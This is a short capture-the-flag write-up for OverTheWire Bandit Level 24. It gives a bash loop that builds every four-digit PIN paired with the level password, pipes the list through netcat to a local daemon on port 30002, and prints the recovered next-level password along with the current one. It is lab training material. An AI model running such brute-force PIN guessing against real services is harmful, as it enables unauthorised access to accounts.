# Bandit Level 24  
  
In this challenge we are being introduced to the fun that is brute forcing  
  
We are given the challenge to send a daemon listning on port 30002 our password and a secret 4 digit pincode  
  
To do this the most efficient way is to write a shell script to create all of the possible passwords  
  
Here is one i came up with:  
```sh  
#!/bin/bash  
password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
  
  
for i in {0000..9999}  
    do  
        echo $password $i >> list.txt  
    done  
```  
  
we can now use the command:  
> cat list.txt | nc localhost 30002  
  
And after this churns its way through passwords it find the password is: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG  
